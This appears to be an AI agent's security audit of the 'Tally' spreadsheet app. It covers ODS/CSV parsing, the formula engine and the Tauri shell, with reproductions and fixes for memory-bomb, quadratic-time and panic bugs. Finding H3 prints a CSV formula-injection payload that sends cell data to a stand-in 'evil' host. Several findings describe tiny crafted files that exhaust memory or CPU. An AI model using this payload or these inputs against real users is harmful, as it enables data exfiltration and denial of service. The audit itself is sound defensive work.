# Tally security review (main @ 01b6af6, plus the working tree where noted)

Scope: crates/tally-io-ods, tally-io-csv, tally-formula, tally-functions, tally-engine, apps/desktop/src-tauri, packages/{app,grid,bridge}, supply-chain config.
Method: I read the code and ran probes from a scratch crate at `$S/probe`, where
`$S=/private/tmp/claude-501/-Volumes-FILES-Projects-OSX-Office/5227e701-ee6d-4d46-9584-0099831db42f/scratchpad`.
Builds used `CARGO_TARGET_DIR=$S/target`. No repo files were modified.
The probes compiled the *working tree*. The engine files that are mid-edit (`document.rs`, `recalc.rs`: preview/shared-context changes) do not touch any of the paths below, and the committed `Document::new` already calls `hard_recalc`.

Probe sources:
- `$S/probe/src/main.rs`: ODS generators plus a `readfile` runner.
- `$S/probe/tests/{fuzz,targeted,ffuzz,nfuzz,stack,doctype}.rs`
- `$S/gen/many.py`: the zip64 central-directory flood.

Saved inputs:
- `$S/formula_clone.ods`
- `$S/sheets1000.ods`
- `$S/bigattr.ods`
- `$S/many2m.ods`
- `$S/slow.csv`
- `$S/csvinj.ods` and `$S/csvinj.csv`

---

## High

### H1. ODS reader: formula text is deep-cloned for every repeated cell (memory bomb)
`crates/tally-io-ods/src/content.rs:295` (`content: content.clone()`), together with `content.rs:334` (`table:formula` → `String`).

`CellContentData::Formula { text: String }` is a `String`, not an `Arc<str>`. A non-empty run is cloned once per materialized cell, and the cell cap allows up to 10M cells. The formula attribute is not length-capped in the reader. The 16 MiB cap only applies to `text:p`, and the 8,192-character parser cap applies later, in the engine.

Reproduction: `probe formula_clone N` writes
`<table:table-row table:number-rows-repeated="600"><table:table-cell table:formula="of:=1+1+…" table:number-columns-repeated="16384"/></table:table-row>` (9.83M cells):
- N=10 (25-byte formula), 456-byte file: 908 MB RSS, 150 ms.
- N=100 (205-byte formula), **460-byte file: 2,065 MB RSS** (`$S/formula_clone.ods`).
- Scaling is linear, so a 2 KB formula needs about 20 GB and the process is OOM-killed. A formula over 8,192 characters also survives into the engine as `Some(raw.into())` (`convert.rs:76-80`), which is another per-cell copy.

The same pattern applies to `office:string-value` (`content.rs:364`). It becomes an `Arc`, so it is not cloned, but it is not capped either: it can be up to 512 MiB.

Fix:
- Make the model's formula text `Arc<str>`. Interning happens for free when one parsed run is cloned.
- Cap `table:formula` at `MAX_FORMULA_LEN` (8,192 chars) and `office:string-value` at `MAX_CELL_TEXT` in the reader. Over-long formulas become `Err:512` text without being kept.
- Add a total "materialized bytes" budget next to `max_cells`.

### H2. Opening a workbook with many sheets of the same name takes cubic time (tiny file, minutes of CPU, app frozen)
`crates/tally-engine/src/workbook.rs:191-207` (`unique_sheet_name` tries `_2`, `_3`, … and does a linear, lowercasing `sheet_by_name_ci` scan for each try, at lines 169-176), plus `add_sheet` calling `reindex()` for every sheet (line 219). It is reached from `convert.rs:37-38`.

`EngineService::open` also renames every unnamed sheet to the file stem (`service/mod.rs:181-185`), so `<table:table/>` with no name triggers it too. The reader has no cap on the number of sheets.

Reproduction:
- `probe writesheets 1000 $S/sheets1000.ods` gives a **483-byte file**. Then `tally-cli recalc $S/sheets1000.ods` prints "1000 sheet(s) … loaded … in 6156.8 ms".
- `probe sheets 2000` (2,000 × `<table:table table:name="A"/>`, 773 bytes): `from_data` took **43.0 s**.
- At about 5,000 sheets the estimate is about 10 minutes, still within a 1 KB compressed file.

During all of this the global `AppState.service` mutex is held, so every other command blocks, including Save of other open documents.

Fix:
- Cap sheets per workbook in the reader and in `add_sheet` (LibreOffice allows 10,000; something like 1,024 is reasonable for Phase A).
- Keep a `HashMap<lowercase name, SheetId>` and a next-suffix counter per base name.
- During `from_data`, push all sheets first and `reindex()` once.

### H3. The CSV export formula-injection guard is bypassed through number formats
`crates/tally-io-csv/src/lib.rs:421-428` (the guard applies only when `is_text`) and `crates/tally-engine/src/service/mod.rs:139-141` (`is_text = matches!(value, Text)`, while the exported text is the *formatted* display).

A number cell whose format contains a literal such as `=HYPERLINK(…)+` displays text that starts with `=`. It is written unguarded.

Reproduction: `probe csvexport $S` builds `$S/csvinj.ods`:
- data style `<number:text>=HYPERLINK("http://evil/?"&amp;A1;"x")+</number:text><number:number number:decimal-places="0"/>`
- applied to `office:value="5"`
- opened with `EngineService::open` and saved with `FileFormat::Csv`

Output (`$S/csvinj.csv`):
```
secret,"=HYPERLINK(""http://evil/?""&A1;""x"")+5",-5
```
Excel, LibreOffice and Sheets evaluate the second field. A comma separator works the same way: `docs/security.md` §CSV says "non-text cells are never altered", and that is exactly the hole. Date and time formats with literals have the same problem.

Fix: decide on the *output string*, not on the value type. Guard any field whose first non-`"` character is a trigger, unless the whole field is a plain numeric literal, e.g. `^-?\d[\d,]*(\.\d+)?(E[+-]?\d+)?%?$` or what the numfmt General/locale output can produce. Then `-5` stays untouched and `=…+5` gets a `'` prefix.

---

## Medium

### M1. No length cap on text values in the evaluator (memory exhaustion from a formula)
`tally-functions` text functions and `&` (`crates/tally-engine/src/eval.rs`) build unbounded `Arc<str>`.

Reproduction: 9 nested `SUBSTITUTE(…,"a","aaaaaaaaaa")` around `"a"` (about 280 characters):
- `tally-cli eval '=LEN(SUBSTITUTE(SUBSTITUTE(…"a"…)))'` returns `1000000000` in 1.65 s with **2.2 GB max RSS**.
- 10 levels would need 10 GB.
- A chain of cells `A2=A1&A1` doubles per cell.

An opened file can carry such a formula, and it is evaluated on open (see M3).

Fix: cap result text at a fixed length and return `#VALUE!`/Err:… beyond it. Excel uses 32,767; LibreOffice is about 2^31, but a 1 MiB–16 MiB cap is defensible. Enforce it centrally, e.g. in the evaluator when it pushes `Value::Text` and in `SUBSTITUTE`/`CONCATENATE`/`TEXT`/`&`.

### M2. The wildcard criteria matcher is O(text × pattern) per cell
`crates/tally-functions/src/criteria.rs:157-187` (the doc comment admits the worst case). Wildcards are the default `CriteriaMode`.

Reproduction: A1 = 1,000,000 × `a` (6 nested SUBSTITUTE), then `=COUNTIF(A1,"*aaaa…(4000)…b")`. That is **3.16 s for one cell**. COUNTIF/SUMIF over a column of such cells multiplies it: 1,000 cells ≈ 50 min. Combined with M1, text can be 16 MiB per cell from ODS, which is about 50 s per cell.

Fix:
- Compile wildcards to a `regex` (linear time, already a dependency, with a size limit) or use a bit-parallel/DP glob.
- With M1's cap, also bound `text.len() * pattern.len()` per call.

### M3. Recalc on open is synchronous, unbounded and not cancellable, under the global lock; CSV import turns `=` fields into live formulas
Where:
- `crates/tally-engine/src/document.rs:44` (`hard_recalc` in `Document::new`)
- `service/mod.rs:166-194` (`open`, called inside `with_service`, `apps/desktop/src-tauri/src/commands.rs:28-34`)
- `convert.rs:67-68` (`recognize` → `set_input`, which parses `=…` as a formula, `workbook.rs:468`)

Reproduction: `$S/slow.csv` is 7.8 KB: 200 lines of `,,=SUMPRODUCT(A1:A1048576*B1:B1048576)`.
- `tally-cli recalc $S/slow.csv` reports "200 formulas; loaded and recalculated in 3106.5 ms" with **935 MB max RSS**.
- 10k lines (≈390 KB) is about 2.5 minutes, and the whole app is frozen (every command waits on the service mutex).

There is a doc gap: `docs/security.md` §5 says "CSV import never interprets content … keeps `=SUM(A1)` as text". That holds for `tally-io-csv`, but the engine evaluates those fields when the file is opened. §8's "cancellable recalc watchdog" is not implemented.

Fix:
- Add a recalc deadline/cancel token checked per formula, and show "recalculation interrupted" with cached values.
- Run open/recalc without holding the service-wide lock (per-document locks).
- For CSV, consider importing `=` fields as text by default, or behind a prompt, like LibreOffice's "Evaluate formulas" option.

### M4. Style deduplication in the ODS reader is quadratic
`crates/tally-io-ods/src/styles.rs:128` (`self.styles.iter().position(|s| *s == data)` once per new style name).

Reproduction: `probe styles N` (N distinct `fo:font-size` automatic styles, each used once):
- 20k styles (176 KB file): 0.35 s
- **60k styles (519 KB file): 3.18 s**
- 500k styles (≈4 MB file): an estimated 3–4 minutes

Fix: a `HashMap<StyleData, u32>` (derive `Hash`; `f32` sizes can be keyed by bits), and/or a cap on distinct styles (Excel allows about 64k).

### M5. The zip central directory is parsed fully before `max_entries` is checked
`crates/tally-io-ods/src/archive.rs:128-137`, and again in `lib.rs:172` (`sniff_is_ods` slow path, which the codec runs first whenever `mimetype` is not the first stored entry).

Reproduction: `python3 -I $S/gen/many.py 2000000 $S/many2m.ods` builds a 103 MB zip64 with 2M CD records that all point to one empty local entry.
- `probe readfile $S/many2m.ods` returns `LimitExceeded zip entries` after 0.3 s, but **max RSS is 822 MB**, of which about 700 MB is the zip crate's index.
- At `MAX_FILE_BYTES` = 512 MiB that is about 10M records, roughly 3.5 GB of RSS, and it happens twice (sniff + open).

The documented claim "entry count is capped before anything is inflated" is true, but it is not capped before indexing.

Fix: read the EOCD and zip64 EOCD yourself (the last 64 KiB plus the locator) and reject `total_entries > max_entries` or `cd_size > N MiB` before `ZipArchive::new`. Do this in both places, or have the codec call `read_ods` once without sniffing.

### M6. One panic in the engine permanently disables the app (mutex poisoning), and other documents' unsaved work is lost
`apps/desktop/src-tauri/src/state.rs:35-38`: poisoning maps to `internal` forever, and there is a single `Mutex<Box<dyn DocumentService>>` for every document.

Any panic while the lock is held poisons it. That covers the file-reachable panics (L1 in debug builds) and any future function bug. After that every command, including `wb_save` for other documents, fails.

In addition, the commands are `async` but use a blocking std `Mutex` on tokio workers. A long open (H2/M3) parks one worker per queued command, which can exhaust the runtime and stall the dialog commands too.

Fix:
- Wrap service calls in `catch_unwind` and recover with `PoisonError::into_inner`, dropping or marking only the affected document.
- Use per-document locks, and `spawn_blocking` for open/save/apply.

### M7. CSV export walks the used range densely
`crates/tally-engine/src/service/mod.rs:130-146`.

A file with values at A1 and XFD1048576 makes "Export as CSV" build 1,048,576 × 16,384 `(String, bool)` pairs, about 17 G entries, and the process is OOM-killed. ODS write is run-length encoded and fine. Copy is capped by `MAX_OP_CELLS`.

I did not run this (it would OOM the host); the loop bounds are explicit.

Fix: stream rows from sparse storage. Emit empty fields up to each row's last cell, cap columns, and stream into the writer instead of collecting.

---

## Low

### L1. A huge year in an ODS date panics in debug builds and wraps in release
`crates/tally-io-ods/src/units.rs:6-14` (`days_from_civil`), reached from `parse_iso_date` (`units.rs:57`, unbounded `i64` year).

Reproduction (`$S/probe/tests/targeted.rs`, debug):
- `office:date-value="9223372036854775807-01-01"` panics with "attempt to multiply with overflow" at `units.rs:9:19`.
- `100000000000000000-01-01` panics the same way at `units.rs:14:5`.

In release builds the value silently wraps to a garbage serial. Under `tauri dev` the panic poisons the service mutex (M6).

Fix: reject years outside, say, -9999..=99999 in `parse_iso_date`, or use `checked_mul` and return `None`.

### L2. A single huge XML attribute or text node is amplified in memory about 2×
`xml.rs:90-97` / `convert_start`: quick-xml buffers the whole event, then `normalized_value().into_owned()` and `Ev::Text(...into_owned())` copy it.

Reproduction: `probe genattr 400 $S/bigattr.ods` makes an 8.5 MB file whose 400 MiB attribute sits on a skipped `<foo>`. `probe readfile` reads it with no error and **857 MB max RSS**.

It is bounded by `max_content_xml_bytes` (512 MiB) at about 2–3×. Text outside cells is materialized before any 16 MiB check.

Fix:
- Lower `max_content_xml_bytes`, or add a per-event cap by checking `self.buf.len()` after each `read_event_into` and failing above, e.g., 32 MiB.
- Skip value normalization for attributes that are not needed.

### L3. Merges are not counted against `max_cells`
`content.rs:247-252`.

Empty spanned cells are pushed to `sheet.merges` before the empty-run filter, and they are never counted. `probe merges 100` (539 KB file) gives **1.64M merges and 285 MB RSS**.

Fix: count merges toward `max_cells`, or cap them separately (e.g. 1M).

### L4. Non-finite numbers from files are accepted
`content.rs:338-347`: `"NaN"`, `"inf"` and `1e309` parse into `Value::Number(NaN/inf)` (verified in `targeted.rs`). Nothing crashed in my runs (sorting uses `total_cmp`), but NaN breaks the invariants that `#NUM!` normally guarantees.

Fix: map non-finite values to `Value::Error(Num)` in the reader.

### L5. Gaps in the injection-guard character set
`lib.rs:418`: no handling of leading spaces or LF before a trigger (`" =1+1"`, which LibreOffice's "trim spaces" import evaluates), or of the full-width forms U+FF1D `＝`, U+FF0B `＋`, U+FF0D `－`, U+FF20 `＠` (some CJK-locale Excel imports normalize these).

Fix: trim Unicode whitespace and `"` before checking, and include the full-width forms.

### L6. The AST's derived `Clone`/`PartialEq`/`Drop` are recursive
`crates/tally-formula/src/ast.rs:355` (`#[derive(Clone, PartialEq, Debug)] enum Expr`).

`=1-1-…-1` with 1,020 operators (inside `MAX_AST_DEPTH` 1024) overflows a 256 KB stack in debug and a 64 KB stack in release on `f.clone()` (`$S/probe/tests/stack.rs`, `binop_2m` with `ST=262144`). It works with 1 MiB in debug and 256 KB in release. The walkers, printer, adjust and explain are iterative and passed.

This is safe today on tokio's 2 MiB workers. It contradicts the eval.rs comment "debug build stays within a 256 KB stack" for anything that clones or drops ASTs.

Fix: lower `MAX_AST_DEPTH` to about 256, or write manual iterative `Drop`/`Clone`.

### L7. `wb_open` works as a file-existence oracle for any path
`apps/desktop/src-tauri/src/files.rs:110`.

`canonicalize` runs *before* the allowlist check, so a compromised webview gets "opening the file: No such file or directory" for paths that do not exist and "not chosen in an Open dialog" for paths that do.

Fix: compare the raw string against the allowlist first, and return a single uniform error.

### L8. The `core:default` capability is broader than the "minimal" claim
`apps/desktop/src-tauri/capabilities/default.json`.

`core:default` expands (per `gen/schemas/acl-manifests.json`) to all of `core:menu:default` (JS can create or replace the app menu: `allow-new`, `allow-set-as-app-menu`, `allow-set-accelerator`, …), `core:tray:default` (create tray icons), `core:image:allow-from-path` (inert, because the `image-*` features are off), `core:event:allow-emit`/`emit-to`, `core:path:allow-resolve-directory` (leaks home and config paths), and `core:webview:allow-internal-toggle-devtools` (inert without the devtools feature).

Fix: list only what the UI uses, e.g. `core:event:allow-listen`, `core:event:allow-unlisten`, `core:window:allow-set-title` and `core:window:allow-start-dragging`.

### L9. Save is not atomic
`service/mod.rs:223` (`std::fs::write(&target, …)` truncates in place). A crash or full disk mid-write destroys the original file, and the write follows symlinks at the target.

Fix: write `target.tmp` in the same directory, `fsync`, then `rename`.

---

## Info

- **Zip duplicate names and header mismatches.** `zip` 9.0.5 collapses duplicate central-directory names with `IndexMap` (last one wins), and `by_index` does not validate local versus central headers (`enforce_header_consistency` is off). The byte limits still hold, because `Guard` + `take(limit+1)` bound *output* and the ratio uses bytes actually pulled. This is a parser differential, not a bypass. `archive.rs` `names.entry().or_insert` therefore only ever sees unique names.
- **Clipboard token.** It comes from a time-seeded xorshift (`service/mod.rs:83`), so it is predictable. The worst case is an external page making Paste insert the user's own last internal copy. Harmless.
- **CSP.** Good: no `unsafe-eval`, and no inline script. `form-action` and `base-uri` are not covered by `default-src`; add `form-action 'none'; base-uri 'none'; object-src 'none'` for defense in depth.
- **Control characters.** NUL and other control characters are accepted in sheet names and text (`table:name="S\0"` gives the name `"S\0"`). React renders them inertly, and the writer replaces them with U+FFFD.
- **Iteration settings.** `table:iteration table:steps` is accepted up to `u32::MAX`. Iteration is not implemented yet; clamp it when it is.
- **`docs/security.md` is stale against the working tree.**
  - The WP7 allowlist item 3 (bundled `templates/`) no longer exists: templates are built in code. The committed `template_path` used a fixed id table, so it had no traversal.
  - §5 "CSV import never interprets content" (see M3).
  - §8 watchdog (not implemented).
  - The "no unwrap; poisoning → internal" line describes M6 as if it were a safety property.

---

## Verified OK

ODS archive and XML handling:
- **Entry bounding.** Every entry read goes through `file.take(max+1)` inside `Guard` *before* the 64 KiB `BufReader`. Only `mimetype` (256 B) is read whole. The total budget is shared across entries (`Rc<Cell>`). Overlapping or duplicate entries cannot exceed the per-entry, total or ratio limits.
- **Compression ratio.** The ratio is checked against the compressed bytes actually pulled (a lying `compressed_size` can only make it stricter). Many entries do not help an attacker, because only six fixed names are ever read.
- **DOCTYPE.** It is rejected in every part I tried: manifest, styles, settings, meta, content, and also mid-document inside a skipped element (`doctype.rs`).
- **Entities.** An undeclared entity is an error. `&#0;`, `&#xD800;` and `&#99999999999999999999;` are rejected cleanly. Invalid UTF-8 is an error.
- **Depth and attribute caps** are enforced at the start tag, before the element is converted.
- **`text:s text:c`.** `u64::MAX` gives a clean `LimitExceeded`, and `16777215` stays within budget.
- **Repeat arithmetic.** Spans of `4294967295` and repeats past the sheet limits are clamped with `u64` math and saturating adds. There is no `u32` overflow in `content.rs`.

Fuzzing:
- **ODS mutation fuzz.** 1,300 mutated variants of the 4 fixtures, in a debug build with overflow checks: attribute-value substitution with 37 extreme values plus structural byte mutations of every XML part. The full pipeline was `read_ods` → `from_data` → `recalc` → `to_data` → `write_ods` → `read_ods`. **0 panics and 0 cases over 2 s**. The only panic found was the targeted L1.
- **Formula fuzz.** 20,000 random formulas (debug): 0 panics, none slower than 1 s. 20,000 random `TEXT()` number-format codes (debug): 0 panics.

Formula engine:
- **Formula length** (8,192 characters) is checked before lexing. Nesting (256) and AST depth (1024) give Err:512. The evaluator, `walk`, printer, adjust, `static_precedents` and explain are iterative or depth-capped.
- **Whole-sheet ranges are iterated sparsely.** `SUM`, `COUNTIF`, `COUNTBLANK`, `MEDIAN`, `MATCH` and `VLOOKUP` over `A1:XFC1048576` each took ≤ 10 ms, with correct counts (17,178,820,605). Array lifting of whole columns is capped at 2^21 and costs about 100 MB per lift. Shape-mismatched broadcasts (`A1:A1048576*B1:XFD1`) give `#VALUE!`, not 17 G elements. There is no multiplicative nesting.
- **Regex criteria** use `size_limit` and `dfa_size_limit` of 1 MiB with the linear-time `regex` crate. A pathological `(a|aa)*…` or `.*a` × 300 against 1 MB of text took ≤ 10 ms.

IPC and API surface:
- **IPC ranges.** `to_range`, `view::cells` (20k cap) and the paste and copy caps (`MAX_OP_CELLS`) validate RangeDto bounds and use `u64` products. `CellRange::new` normalizes order.

Tauri shell:
- `withGlobalTauri: false`, no devtools feature, and no `dialog:*`, `fs`, `shell` or `http` permission for JS.
- Dialogs run on `spawn_blocking`, not on the main thread.
- The 20 registered commands match `docs/api.md` and `packages/bridge/src/tauri.ts` exactly.
- Save paths come only from the dialog or the tracked document path.
- Template ids map to a fixed table (committed) or to code (working tree).

Frontend:
- There are no `dangerouslySetInnerHTML`, `innerHTML`, `insertAdjacentHTML`, `DOMParser`, `eval`, `window.open` or `href` sinks in packages/app, grid or bridge.
- Pasted external HTML is only regex-scanned for the token and never inserted into the DOM.
- The engine's clipboard HTML escapes `& < > " '` for cell text and the token.
- `localStorage` holds only the "recent seen" timestamps, with try/catch.

Supply chain and build:
- Crates are pinned exactly with `=`, and the lockfiles are present.
- `deny.toml` denies unknown registries and git sources, wildcards and yanked crates.
- pnpm `allowBuilds` allows only esbuild, and no package.json has install or postinstall scripts.
- The only `build.rs` is `tauri_build::build()`, which makes no network access.
- `unsafe_code = "forbid"` is set workspace-wide, and there are no `unwrap`/`expect` calls in non-test code of the IO crates, the engine or the shell.
